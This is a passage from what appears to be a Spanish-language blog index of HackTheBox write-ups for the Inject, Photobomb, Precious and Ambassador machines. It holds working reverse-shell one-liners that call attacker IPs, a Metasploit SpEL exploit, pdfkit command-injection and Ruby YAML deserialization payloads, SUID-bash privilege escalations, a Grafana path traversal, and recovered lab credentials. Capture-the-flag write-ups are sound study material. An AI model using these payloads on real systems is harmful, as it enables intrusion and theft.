0{\"timestamp\":\"2023-04-04T19:33:45.482+00:00\",\"status\":500,\"error\":\"Internal Server Error\",\"message\":\"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String\",\"path\":\"/functionRouter\"}#                                                                                                                                                Nos llega la shell.❯ nc -lvnp 443❯ nc -lvnp 443listening on [any] 443 ...connect to [10.10.14.83] from (UNKNOWN) [10.10.11.204] 34776bash: cannot set terminal process group (815): Inappropriate ioctl for devicebash: no job control in this shellfrank@inject:/$ Explotación con MetaSploitNos abrimos metasploitmsfconsoleUsando de apoyo este foro nos guiaremos. Una vez dentro de metasploit  haremos lo siguiente.[msf](Jobs:0 Agents:0) &gt;&gt; use exploit/multi/http/spring_cloud_function_spel_injection[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp[msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) &gt;&gt; set RHOST 10.129.178.241RHOST =&gt; 10.129.178.241[msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) &gt;&gt; set LHOST 10.10.14.170LHOST =&gt; 10.10.14.170[msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) &gt;&gt; run[*] Started reverse TCP handler on 10.10.14.170:4444 [*] Running automatic check (\"set AutoCheck false\" to disable)[!] The service is running, but could not be validated.[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp[*] Command Stager progress - 100.00% done (823/823 bytes)[*] Sending stage (3045348 bytes) to 10.129.178.241[*] Meterpreter session 1 opened (10.10.14.170:4444 -&gt; 10.129.178.241:43644) at 2023-03-12 21:25:11 -0400(Meterpreter 1)(/) &gt; shellProcess 76003 created.Channel 1 created.whoami &amp;&amp; idfrankuid=1000(frank) gid=1000(frank) groups=1000(frank)Ahora para mayor comodidad nos pasaremos esa shell mediante reverse shell, comprobamos si esta python3 y efectivamente esta instalado.export RHOST=\"10.10.14.170\";export RPORT=443;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")'En nuestra máquina nos ponemos en escucha por el puerto 443 y nos debe llegar.❯ nc -lvnp 443listening on [any] 443 ...connect to [10.10.14.170] from (UNKNOWN) [10.129.178.241] 48474frank@inject:/$Aplicamos tratamiento a la TTY.Migración de usuarioEn la carpeta personal del usuario listamos carpetas escondidadfrank@inject:~$ ls -a.  ..  .bash_history  .bashrc  .cache  .local  .m2  .profilefrank@inject:~$ la carpeta .m2 nos llama la atención, listamos su contenidofrank@inject:~$ ls .m2settings.xmlfrank@inject:~$ cat .m2/*&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;settings xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"        xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt;  &lt;servers&gt;    &lt;server&gt;      &lt;id&gt;Inject&lt;/id&gt;      &lt;username&gt;phil&lt;/username&gt;      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;      &lt;privateKey&gt;${user.home}/.ssh/id_dsa&lt;/privateKey&gt;      &lt;filePermissions&gt;660&lt;/filePermissions&gt;      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;      &lt;configuration&gt;&lt;/configuration&gt;    &lt;/server&gt;  &lt;/servers&gt;&lt;/settings&gt;frank@inject:~$ Vemos la contraseña del usuario phil, migramos…frank@inject:~$ su philPassword:DocPhillovestoInject123 phil@inject:/home/frank$ …en su carpeta personal procedemos a leer la primera flag.phil@inject:~$ cat user.txt be****************************36phil@inject:~$ Escalada de PrivilegiosNo encontramos ningún binario SUID o permiso sudo, pero si si vemos a los grupos que pertenecemos vemos un grupo extraño staff.phil@inject:~$ iduid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)phil@inject:~$ Si listamos si tenemos capacidad para dicho grupo nos encontramos con estó.phil@inject:~$ find / -group staff -print 2&gt;/dev/null/opt/automation/tasks/root/var/localLa ruta /opt/automation/tasks nos llama la atención.phil@inject:~$ ls /opt/automation/tasks/playbook_1.ymlphil@inject:~$Si miramos el archivo se modificó recientemente, por lo cual puede que exista una tarea cron.Si volvemos a volver a checkear el archivo se modifico 2 minutos después.phil@inject:/opt/automation/tasks$ ls -lahtotal 12Kdrwxrwxr-x 2 root staff 4.0K Mar 13 01:46 .drwxr-xr-x 3 root root  4.0K Oct 20 04:23 ..-rw-r--r-- 1 root root   150 Mar 13 01:46 playbook_1.ymlphil@inject:/opt/automation/tasks$Un archivo .YML buscamos en internet el nombre del arvhivo “playbook”. Buscando en internet nos encotramos con este blog que nos lleva a un archivo de github. Creamos un archivo shell.yml con el siguiente contenido.Esto copiara la bash en la carpeta actual y la convertirá en SUID y podemos spawnear una shell como root.---                                                                                                               - name: shell                                                                                                    hosts: localhost  become: yes  tasks:  - name: hack    shell: \"cp /bin/bash . &amp;&amp; chmod +sx bash\"Una vez pasado los 2 minutos spawneamos la shell como root con:/usr/bin/ansible-playbook shell.yml./bash -pHurra!!!! somos root, procedemos a leer la flag del usuario rootbash-5.0# cat root.txt4e****************************67bash-5.0# Máquina Pwneada, sigue así muchacho."
  },
  
  {
    "title": "Photobomb WriteUp",
    "url": "/posts/photobomb-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "linux, hackthebox, writeup, easy, command injection, path hijacking, virtual hosting",
    "date": "2023-02-03 17:00:00 +0100",
    





    "snippet": "Hoy tocará explotar la máquina Photobomb de HackTheBox, es de dificultad fácil. Haremos un command injection y para la escalada haremos un Path HijackingEscaneo NMAPAntes de empezar les recomiendo hacer un escaneo para saber que puertos estan abiertos y que servicios corren por ellos, ya que esta información nos sera util para continuar con la prueba de penetración.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.182 -oG allPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-04 13:24 -04Initiating SYN Stealth Scan at 13:24Scanning 10.10.11.182 [65535 ports]Discovered open port 80/tcp on 10.10.11.182Discovered open port 22/tcp on 10.10.11.182Completed SYN Stealth Scan at 13:24, 17.92s elapsed (65535 total ports)Nmap scan report for 10.10.11.182Host is up, received user-set (0.16s latency).Scanned at 2023-02-04 13:24:12 -04 for 18sNot shown: 61907 closed tcp ports (reset), 3626 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE REASON22/tcp open  ssh     syn-ack ttl 6380/tcp open  http    syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 18.08 seconds           Raw packets sent: 87248 (3.839MB) | Rcvd: 67894 (2.716MB)Nos percatamos que tiene el SSH abierto y el puerto 80 que corresponde al HTTP, al entrar a la web no vemos nada, ya que se esta aplicando virtual hosting, para solucionarlo hacemos lo siguiente:echo \"10.10.11.182       photobomb.htb\" | tee -a /etc/hostsEnumeraciónVemos una pagina de inicio con un redirect a /printer Web SiteSi intentamos acceder nos pedirá credenciales Log inPodemos probar credenciales típicas por defecto, pero no resultará útil.admin:adminadmin:passwordadmin:passguest:guestSi revisamos el código fuente nos encontramos con cosaas interesantes.Le aplicamos un curl.❯ curl -s -X GET http://photobomb.htb&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;title&gt;Photobomb&lt;/title&gt;  &lt;link type=\"text/css\" rel=\"stylesheet\" href=\"styles.css\" media=\"all\" /&gt;  &lt;script src=\"photobomb.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id=\"container\"&gt;    &lt;header&gt;      &lt;h1&gt;&lt;a href=\"/\"&gt;Photobomb&lt;/a&gt;&lt;/h1&gt;    &lt;/header&gt;    &lt;article&gt;      &lt;h2&gt;Welcome to your new Photobomb franchise!&lt;/h2&gt;      &lt;p&gt;You will soon be making an amazing income selling premium photographic gifts.&lt;/p&gt;      &lt;p&gt;This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.&lt;/p&gt;      &lt;p&gt;To get started, please &lt;a href=\"/printer\" class=\"creds\"&gt;click here!&lt;/a&gt; (the credentials are in your welcome pack).&lt;/p&gt;      &lt;p&gt;If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.&lt;/p&gt;    &lt;/article&gt;  &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;Podemos ver un script de JavaScript, si vemos su contenido se nos filtra una cookie❯ curl -s -X GET http://photobomb.htb/photobomb.jsfunction init() {  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me  if (document.cookie.match(/^(.*;)?\\s*isPhotoBombTechSupport\\s*=\\s*[^;]+(.*)?$/)) {    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');  }}window.onload = init;Al copiar dicha cookie, podemos ver el panel /printer.Log inExplotaciónEn este apartado vemos unas imagenes las cuales podemos descargar y hacer pequeñas modificaciones como ser:  Cambiarle la extensión y modicar el tamaño.PrinterPodemos interceptar la petición con BurpSuite y ver mas a detalles como se estructura todoBurpSuitePodemos ver si es vulnerable a un Command injection, pero antes que nada inicia un servidor con pythonpython -m http.server 80Mandamos la petición al Repeater, para ello presionamos Ctrl + RSi nos fijamos en los parametros podemos agregar ; y añadir nuestro comando, se vería asíBurpSuitePodemos ver que no le gusta en algunos parametros, pero con haciendo prueba y error encontramos que el parametro filetype es vulnerable, lo podemos comprobar en la petición❯ python -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.11.182 - - [04/Feb/2023 14:45:12] \"GET / HTTP/1.1\" 200 -Podemos intentar enviarnos una reverse shell, usano esta página podemos hacer la reverse shell con varias opciones.Probaremos con bash pero no funciona, así que podemos probar con python3 y esta nos lanzará la shellexport RHOST=\"10.10.14.25\";export RPORT=444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")'RCE  Nota: Si usas nc mkfifo y url encode te lanzará la shell igualrm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.14.25%20444%20%3E%2Ftmp%2FfGanamos acceso a la máquina, estamos listos para rootearla❯ nc -lvnp 444listening on [any] 444 ...connect to [10.10.14.25] from (UNKNOWN) [10.10.11.182] 49946wizard@photobomb:~/photobomb$ Toca realizar un tratamiento a la tty, te puedes guiar de mi blog.Una vez adentro podemos leer la primera flagwizard@photobomb:~/photobomb$ cat ../user.txt 06****************************78wizard@photobomb:~/photobomb$ Escalada de privilegiosSi vemos los privilegios SUDOERS vemos que podemos ejecutar un programa hecho en bashwizard@photobomb:~/photobomb$ sudo -lMatching Defaults entries for wizard on photobomb:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser wizard may run the following commands on photobomb:    (root) SETENV: NOPASSWD: /opt/cleanup.shwizard@photobomb:~/photobomb$ Vemos que lo podemos ejecutar sin proporcionar ninguna contraseña, es decir que al ejecuralo como sudo sera ejecutado de forma temporal como root sin proporcionar contraseñawizard@photobomb:~/photobomb$ sudo /opt/cleanup.sh wizard@photobomb:~/photobomb$ Si vemos el contenido de dicho archivo nos encontramos con binarios que podemos usar para elevar nuestros privilegios.wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh #!/bin/bash. /opt/.bashrccd /home/wizard/photobomb# clean up log filesif [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ]then  /bin/cat log/photobomb.log &gt; log/photobomb.log.old  /usr/bin/truncate -s0 log/photobomb.logfi# protect the priceless originalsfind source_images -type f -name '*.jpg' -exec chown root:root {} \\;wizard@photobomb:~/photobomb$ Vemos que el binario find esta con ruta relativa no absoluta y esto puede derivar a un Path Hijacking,Podemos aprovechar que podemos cambiar variables de entorno como el Path para que nos ejecute el comando find personalizado, y bajo el contexto de sudo nuestro binario find lo ejecutará root.wizard@photobomb:/tmp$ echo bash &gt; findwizard@photobomb:/tmp$ chmod 777 find wizard@photobomb:/tmp$ sudo PATH=$PWD:$PATH /opt/cleanup.shwizard@photobomb:/tmp$ ls -l /bin/bashroot@photobomb:/home/wizard/photobomb# Ya rooteamos la máquina, lo que hicimos fue hacer un binario perzonalizado find que nos lanze una bash como root, en este caso, ya que el esta ejecutando el /opt/cleanup.sh con el binario find de forma relativa.Procedemos a leer la flagroot@photobomb:/home/wizard/photobomb# cat /root/root.txt 74****************************35root@photobomb:/home/wizard/photobomb# ¡¡¡Máquina Pwneada!!! Te deseo un Feliz Hackeo."
  },
  
  {
    "title": "Precious WriteUp",
    "url": "/posts/precious-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "linux, hackthebox, writeup, command injection, pdfkit, easy, virtual hosting",
    "date": "2023-01-16 17:00:00 +0100",
    





    "snippet": "Les explicaré cómo comprometer la máquina Precious de HackTheBox. En esta máquina nos enfretaremos a una versión vulnerable de pdfkit con la cual ganaremos acceso por una reverse shell y para la escalada cargaremos un archivo para convertir la BASH en SUID.Identificando el OSPara ello debemos enviar una traza ICMP(Internet Control Message Protocol), estas siglas sinifican Protocolo de Mensajes de Control de Internet y con la información que nos reporte podemos identificar el SO mediante el TTL(Time To live)❯ ping -c1 10.10.11.189PING 10.10.11.189 (10.10.11.189) 56(84) bytes of data.64 bytes from 10.10.11.189: icmp_seq=1 ttl=63 time=146 ms--- 10.10.11.189 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 146.342/146.342/146.342/0.000 msVemos lo siguiente:  TTL          El TTL es 63, esto indica que es una máquina Linux, ya que dichas máquinas cuentan con un TTL igual a 64, pero…..porqué aparece como 63 e infiero que es Linux. bueno nuestra conexión no es directa, pasa por un nodo intermedario y eso hace que el TTL disminuya en una unidad.      Primeros pasosSi le aplicamos un curl con modo silent y para ver por las cabeceras y filtrando por location vemos un dominio❯ curl s 10.10.11.189 -i | grep LocationLocation: http://precious.htb/Sabiendo que se aplica Virtual Hosting debemos agregar el dominio al /etc/hostsecho 10.10.11.189   precious.htb   | tee -a /etc/hostsEscaneo NMAPSiempre que queramos auditar una máquina debemos aplicar un escaneo NMAP, ya que nos permitirá saber que puertos estan abiertos para poder empezar la fase de explotación❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.189Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 12:45 -04Initiating SYN Stealth Scan at 12:45Scanning 10.10.11.189 [65535 ports]Discovered open port 80/tcp on 10.10.11.189Discovered open port 22/tcp on 10.10.11.189Completed SYN Stealth Scan at 12:46, 15.23s elapsed (65535 total ports)Nmap scan report for 10.10.11.189Host is up, received user-set (0.16s latency).Scanned at 2023-02-19 12:45:56 -04 for 15sNot shown: 65471 closed tcp ports (reset), 62 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE REASON22/tcp open  ssh     syn-ack ttl 6380/tcp open  http    syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 15.35 seconds           Raw packets sent: 74834 (3.293MB) | Rcvd: 73784 (2.951MB)  Vemos los puertos          22 este puerto corre por defecto el servicio SSH      80 este es el encargado del purto WEB, es decir el HTTP      EnumeraciónVemos que en la web podemos convertir una Web a PDF, suena interesante, así que nos creamos un archivo .html con la siguiete estructuraPágina Web❯ cat index.html&lt;h1&gt; Hola Mundo &lt;/h1&gt;Creamos un servivor HTTP con python por el puerto 80 y en dicha web ponemos nustro servidor.  Recuerda cambiar tu IP.WEBAl darle Submit nos genera el PDF, si miramos los metadatos vemos la versión de PDFKIT❯ exiftool PDF.pdfExifTool Version Number         : 12.16File Name                       : PDF.pdfDirectory                       : .File Size                       : 10 KiBFile Modification Date/Time     : 2023:02:19 13:10:53-04:00File Access Date/Time           : 2023:02:19 13:10:53-04:00File Inode Change Date/Time     : 2023:02:19 13:11:14-04:00File Permissions                : rw-r--r--File Type                       : PDFFile Type Extension             : pdfMIME Type                       : application/pdfPDF Version                     : 1.4Linearized                      : NoPage Count                      : 1Creator                         : Generated by pdfkit v0.8.6Al hacer una simple busqueda por google, nos encontramos con este articuloAl usar este payload, debemos cambiar el sleep por una reverse shell.http://example.com/?name=#{'%20`sleep 5`'}Nos quedaría de esta manera.http://example.com/?name=#{'%20`bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.19/444 0&gt;&amp;1\"`'}Una vez enviada la petición nos llega la reverse shell❯ nc -lvnp 444listening on [any] 444 ...connect to [10.10.14.19] from (UNKNOWN) [10.10.11.189] 47004bash: cannot set terminal process group (676): Inappropriate ioctl for devicebash: no job control in this shellruby@precious:/var/www/pdfapp$ Aplicamos un tratamiento a la TTYMigrando de UsuarioSomos el usuario ruby, si miramos en el directorio home por archivos ocultos nos encontramos con estoruby@precious:~$ ls -latotal 32drwxr-xr-x 5 ruby ruby 4096 Feb 19 12:28 .drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -&gt; /dev/null-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrcdr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundledrwxr-xr-x 4 ruby ruby 4096 Feb 19 08:27 .cachedrwxr-xr-x 3 ruby ruby 4096 Feb 19 12:28 .local-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profileSi leemos lo que exixte dentro de esa carpeta vemos las credenciales del usuario henryruby@precious:~$ cat .bundle/config ---BUNDLE_HTTPS://RUBYGEMS__ORG/: \"henry:Q3c1AqGHtoI0aXAYFH\"Migramos de usuarioruby@precious:~$ ssh henry@10.10.11.189The authenticity of host '10.10.11.189 (10.10.11.189)' can't be established.ECDSA key fingerprint is SHA256:kRywGtzD4AwSK3m1ALIMjgI7W2SqImzsG5qPcTSavFU.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.11.189' (ECDSA) to the list of known hosts.henry@10.10.11.189's password: Q3c1AqGHtoI0aXAYFH Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sun Feb 19 10:46:31 2023 from 10.10.14.103henry@precious:~$ Procedemos a leer la flag del usuariohenry@precious:~$ cat user.txt 67****************************bchenry@precious:~$ Escalada de PrivilegiosViendo por permisos SUDO nos encontramos con estehenry@precious:~$ sudo -lMatching Defaults entries for henry on precious:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser henry may run the following commands on precious:    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rbSi leemos ese archivo vemos que intenta cargar el archivo “dependencies.yml”, si buscamos por internet nos encontramos con este blog y este repositorio de GitHub, nos creamos un archi con este contenido.---- !ruby/object:Gem::Installer    i: x- !ruby/object:Gem::SpecFetcher    i: y- !ruby/object:Gem::Requirement  requirements:    !ruby/object:Gem::Package::TarReader    io: &amp;1 !ruby/object:Net::BufferedIO      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry         read: 0         header: \"abc\"      debug_output: &amp;1 !ruby/object:Net::WriteAdapter         socket: &amp;1 !ruby/object:Gem::RequestSet             sets: !ruby/object:Net::WriteAdapter                 socket: !ruby/module 'Kernel'                 method_id: :system             git_set: id         method_id: :resolveCambiamos el id por:  chmod +s /bin/bashCon esto nuestra BASH sera SUID---- !ruby/object:Gem::Installer    i: x- !ruby/object:Gem::SpecFetcher    i: y- !ruby/object:Gem::Requirement  requirements:    !ruby/object:Gem::Package::TarReader    io: &amp;1 !ruby/object:Net::BufferedIO      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry         read: 0         header: \"abc\"      debug_output: &amp;1 !ruby/object:Net::WriteAdapter         socket: &amp;1 !ruby/object:Gem::RequestSet             sets: !ruby/object:Net::WriteAdapter                 socket: !ruby/module 'Kernel'                 method_id: :system             git_set: chmod +s /bin/bash         method_id: :resolveEjecutamos el comandohenry@precious:~$ sudo ruby /opt/update_dependencies.rb henry@precious:~$ ls -l /bin/bash-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bashhenry@precious:~$ Ahora podemos lanzarnos la bash como root y leemos la flag de roothenry@precious:~$ bash -pbash-5.1# whoami &amp;&amp; idrootuid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root) groups=0(root),1000(henry)bash-5.1# bash-5.1# cat /root/root.txt 85****************************f4bash-5.1# Acabamos de comprometer la máquina, Buena suerte."
  },
  
  {
    "title": "Ambassador WriteUp",
    "url": "/posts/ambassador-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "linux, hackthebox, writeup, grafana, directory transversal, arbitrary file read, medium",
    "date": "2023-01-16 17:00:00 +0100",
    





    "snippet": "Les explicare cómo comprometer la máquina Ambassador de HackTheBox, Nos enfrentaremos a una version de Grafana la cual cuenta con una vulnerabilidad de tipo Directory Transversal y Arbitrary File Read. Para ganar acceso al sistema nos aprovecharemos de aquella vulneravilidad de grafana que nos aprovecharemos de en exploit de Consul con un token que nos lanzará la shell como root.Escaneo NMAPEmpezamos enumerando con NMAP, con ello encontaremos los puertos abiertos y los servicios que se exponen.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.183 -oG allPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-21 00:03 -04Initiating SYN Stealth Scan at 00:03Scanning 10.10.11.183 [65535 ports]Discovered open port 80/tcp on 10.10.11.183Discovered open port 3306/tcp on 10.10.11.183Discovered open port 22/tcp on 10.10.11.183Discovered open port 3000/tcp on 10.10.11.183Completed SYN Stealth Scan at 00:03, 17.01s elapsed (65535 total ports)Nmap scan report for 10.10.11.183Host is up, received user-set (0.32s latency).Scanned at 2023-01-21 00:03:39 -04 for 17sNot shown: 61030 closed tcp ports (reset), 4501 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT     STATE SERVICE REASON22/tcp   open  ssh     syn-ack ttl 6380/tcp   open  http    syn-ack ttl 633000/tcp open  ppp     syn-ack ttl 633306/tcp open  mysql   syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 17.22 seconds           Raw packets sent: 82990 (3.652MB) | Rcvd: 66979 (2.679MB)Puerto 22 su servicio por defecto es SSH, 80 este puerto en su configuración por defecto corre el servicio HTTP, MySQL corre en el puerto 3306 y el puerto 3000 fue asignado por el administradorEnumeraciónPodemos realizar FUZZING para ver si encontramos ninggun directorio, pero esto resultaría inutíl ya que no encontraremos nada, en su lugar podemos usar el puerto que encontramos y tratar de acceder a él.Viendo la web nos encontramos con esto:Grafana LoginViendo en la parte inferior nos da información acerca de la versión, usando searchsploit nos damos cuenta de que cuenta con estas vulnerabilidades Directory Traversal and Arbitrary File ReadSearchsploitPodemos copiar el script de Python en nuestra carpeta de trabajo e intentamos leer el /etc/passwd❯ searchsploit -m multiple/webapps/50581.py  Exploit: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read      URL: https://www.exploit-db.com/exploits/50581     Path: /snap/searchsploit/62/opt/exploitdb/exploits/multiple/webapps/50581.py    Codes: CVE-2021-43798 Verified: FalseFile Type: Python script, ASCII text executableCopied to: /home/h4ckerlite/Desktop/h4ckerlite/HTB/Máquinas/Ambassador/nmap/50581.pyLo ejecutamos…SearchsploitBuscando en internet acerca de este CVE nos encontramos con este blog, nos enseñan a explotarlo de forma manual.❯ curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../etc/passwd | grep sh$root:x:0:0:root:/root:/bin/bashdeveloper:x:1000:1000:developer:/home/developer:/bin/bashSi seguimos leyendo podemos ver que nos podemos descargar la base de datos curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.dbAhora procedemos a leer la base de datos, para ello debes tener instalado sqlite3 para verlo desde consola, ya que lo considero mas fácil.  sudo apt install sqlite3Sigueindo las instrucciones del blog leemos la base de datos. sqlite3 grafana.bdUna vez detro de la base de datos, procedemos a leer las tablas ❯ sqlite3 grafana.dbSQLite version 3.34.1 2021-01-20 14:10:07Enter \".help\" for usage hints.sqlite&gt; .tablesalert                       login_attempt             alert_configuration         migration_log             alert_instance              ngalert_configuration     alert_notification          org                       alert_notification_state    org_user                  alert_rule                  playlist                  alert_rule_tag              playlist_item             alert_rule_version          plugin_setting            annotation                  preferences               annotation_tag              quota                     api_key                     server_lock               cache_data                  session                   dashboard                   short_url                 dashboard_acl               star                      dashboard_provisioning      tag                       dashboard_snapshot          team                      dashboard_tag               team_member               dashboard_version           temp_user                 data_source                 test_data                 kv_store                    user                      library_element             user_auth                 library_element_connection  user_auth_token           sqlite&gt; Usando una query de SQL, leeremos las columnas de la tabla data_source.select * from data_source;Veremos algo cómo esto.sqlite&gt; SELECT * FROM data_source;2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-01-20 21:54:47|0|{}|1|uKewFgM4zsqlite&gt; Ganamos accesoDonde el parámetro -h corresponde al host -u  al user -p a la contraseñaAhora nos podemos conectar a MySQL debido a que conocemos el user y su contraseña.❯ mysql -h10.10.11.183 -ugrafana -pdontStandSoCloseToMe63221!Welcome to the MariaDB monitor.  Commands end with ; or \\g.Your MySQL connection id is 47Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MySQL [(none)]&gt; show databases;+--------------------+| Database           |+--------------------+| grafana            || information_schema || mysql              || performance_schema || sys                || whackywidget       |+--------------------+6 rows in set (0,172 sec)MySQL [(none)]&gt; use whackywidget;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMySQL [whackywidget]&gt; show tables;+------------------------+| Tables_in_whackywidget |+------------------------+| users                  |+------------------------+1 row in set (0,396 sec)MySQL [whackywidget]&gt; SELECT * FROM users;+-----------+------------------------------------------+| user      | pass                                     |+-----------+------------------------------------------+| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |+-----------+------------------------------------------+1 row in set (0,375 sec)MySQL [whackywidget]&gt; Vemos una contraseña, esta se encuentra cifrada en Base64, podemos decifrarla de la siguiente manera.echo \"YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==\" | base64 -d;echo anEnglishManInNewYork027468Con esas credenciales podemos conectarnos por SSH.❯ ssh developer@10.10.11.183The authenticity of host '10.10.11.183 (10.10.11.183)' can't be established.ECDSA key fingerprint is SHA256:+BgUV7q/7f6W3/1eQWhIKW2f8xTcBh3IM0VwbIAp2A8.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.11.183' (ECDSA) to the list of known hosts.developer@10.10.11.183's password: anEnglishManInNewYork027468 Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Sat 21 Jan 2023 05:10:23 AM UTC  System load:  0.0               Processes:             229  Usage of /:   84.4% of 5.07GB   Users logged in:       0  Memory usage: 49%               IPv4 address for eth0: 10.10.11.183  Swap usage:   0%0 updates can be applied immediately.The list of available updates is more than a week old.To check for new updates run: sudo apt updateFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Sat Jan 21 00:27:29 2023 from 10.10.14.105developer@ambassador:~$ export TERM=xtermdeveloper@ambassador:~$ Podemos leer la primara flag.developer@ambassador:~$ cat user.txt 565**************************1b5developer@ambassador:~$ Enumeración del sistemaEn la carpeta home buscamos por carpetas/archivos ocultos y encontramos un archivo de configuración de github.developer@ambassador:~$ ls -a.  ..  .bash_history  .bash_logout  .bashrc  .cache.gitconfig  .gnupg  .lesshst  .local  .profile  .ssh  snap  user.txtdeveloper@ambassador:~$ Si lo leemos nos dice la ruta donde se encuentra.developer@ambassador:~$ cat .gitconfig [user]    name = Developer    email = developer@ambassador.local[safe]    directory = /opt/my-appdeveloper@ambassador:~$ Si nos situamos en la carpeta /opt podemos ver el proyecto github.developer@ambassador:/opt/my-app$ ls -a.  ..  .git  .gitignore  env  whackywidgetdeveloper@ambassador:/opt/my-app$ Si hacemos un git -log podemos ver los últimos commits que se aplicarondeveloper@ambassador:/opt/my-app$ git logcommit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main)Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 23:47:36 2022 +0000    tidy config scriptcommit c982db8eff6f10f8f3a7d802f79f2705e7a21b55Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 23:44:45 2022 +0000    config scriptcommit 